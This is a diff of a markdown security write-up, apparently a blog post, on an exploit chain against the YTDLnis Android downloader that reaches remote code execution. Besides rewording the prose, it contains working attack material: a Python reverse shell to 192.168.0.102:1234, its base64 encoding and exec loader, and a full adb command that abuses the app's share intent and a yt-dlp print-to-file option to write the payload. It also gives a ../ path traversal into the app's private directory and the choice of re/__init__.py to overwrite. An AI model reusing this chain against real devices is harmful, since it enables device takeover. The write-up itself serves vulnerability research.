@@ -14,7 +14,7 @@ tags:
   - RCE
   - Python
 author: "zerofrost"
-image: "/images/YTDLnis/banner.png"
+image: "/images/YTDLnis/banner_black.png"
 draft: false
 ---
 
@@ -308,40 +308,68 @@ Now that we have verified the arbitrary file write vulnerability, we now need to
 #### Setting the Stage
 This application ships with `python3.11` because the application relies on the `yt-dlp` library which is written in python. This creates a good attack surface that we could leverage for RCE. By writing to a python file here, we could overwrite a file to contain our malicious payload, which would then trigger a reverse shell.
 
-Therefore, we can start preparing a python payload for use. Initially, I tried to use the following payload format, which did not work for some reason. 
+At this stage, we can begin preparing a Python payload for exploitation. My initial attempt used the following payload format; however, it did not execute successfully for reasons that remain unclear.
+
 ```c
 import os;os.system("echo some_random_base64_here=|base64 -d|sh")
 ```
 
-As a result, I ended up using a python reverse shell, which I then encoded as base64 to avoid issues in escaping quotes
+To work around this issue, I instead opted to use a Python-based reverse shell. The payload was subsequently Base64-encoded to simplify quote escaping and improve reliability when injected into the vulnerable command context.
+
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
 
-base64 encoded
+The resulting Base64-encoded payload is shown below:
 ```c
 aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4xMDIiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw==
 ```
 
-Python code to decode and execute the reverse shell
+To decode and execute the payload at runtime, we can call the following python snippet:
 ```c
 exec(__import__("base64").b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4xMDIiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw==").decode())
 ```
 
-Below is the final Adb command.
+Below is the final `adb` command used:
 ```c
 adb shell 'am start -n com.deniscerri.ytdl/.receiver.ShareActivity -a android.intent.action.VIEW -d "https://oracleupdates.requestcatcher.com/$RANDOM.mp4" --ez quick_download true --es TYPE video --ez BACKGROUND true --es COMMAND "--print-to-file '\''exec(__import__(\"base64\").b64decode(\"aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMC4xMDIiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw==\").decode());'\'' fffff"'				
 ```
 ![](/images/YTDLnis/Pasted%20image%2020260521233258.png)
 
-Excellent! We can see that our payload was successfully written to our file.
+As shown above, the payload was successfully written to the target file, confirming that the file write works as expected.
 
 ### Path Traversal  
-Now that our payload was written to our file without any issues, The next step is to find a python file to write. However, our files are written to `/storage/emulated/0/Download/YTDLnis/Video` and we need to write to `/data/data/com.deniscerri.ytdl/no_backup`. If we used an absolute path, we would end up trying to write to `/storage/emulated/0/Download/YTDLnis/Video//storage/emulated/0/Download/YTDLnis/Video` , since the application may try to concatenate the two paths. Our solution for this, path traversal. We can traversal back using `../../` to make the path `/storage/emulated/0/Download/YTDLnis/Video/../../../../../../../../../../../../../../data/data/com.deniscerri.ytdl/no_backup/somefile.txt`
+Now that the payload was successfully written to disk, the next step is to identify a suitable Python file target for exploitation. However, there was one important limitation: files created by the application were written under the following directory:
+
+```c
+/storage/emulated/0/Download/YTDLnis/Video
+```
+
+Our goal, however, is to write to the application's private directory:
+
+```c
+/data/data/com.deniscerri.ytdl/no_backup
+```
+
+Using an absolute path directly was not viable, as the application might concatenate the supplied filename with its predefined output directory. As a result, attempting to use an absolute path would produce something similar to the following:
+
+```c
+/storage/emulated/0/Download/YTDLnis/Video//storage/emulated/0/Download/YTDLnis/Video
+```
+
+To bypass this restriction, I leveraged a classic path traversal. By repeatedly traversing upward using `../../`, it became possible to escape the intended directory structure and reach the application's private data directory.
+
+The final traversal path looked as follows:
+
+```c
+/storage/emulated/0/Download/YTDLnis/Video/../../../../../../../../../../../../../../data/data/com.deniscerri.ytdl/no_backup/somefile.txt
+```
+
+This allowed arbitrary file writes outside the intended download directory, enabling controlled writes into the application's internal storage where the application has write permissions.
 
   
 ### Picking a Target  
-Now for the final part of the exploit, we need to find a python file to overwrite. The file we pick should be a file that is used regularly by the application. The more the file is used, the higher the success rate of our python code being executed.
+Now for the next part of the exploit, we need to find a python file to write to. The file we pick should be a file that is used regularly by the application. The more the file is used, the higher the success rate of our python code being executed.
 
 After looking around the python code base, One module was imported quite a number of times i.e  `import re`, which made it an ideal target. Therefore, I chose to target the file `/data/data/com.deniscerri.ytdl/no_backup/youtubedl-android/packages/python/usr/lib/python3.11/re/__init__.py`, which is executed when the `re` module is imported. 
 
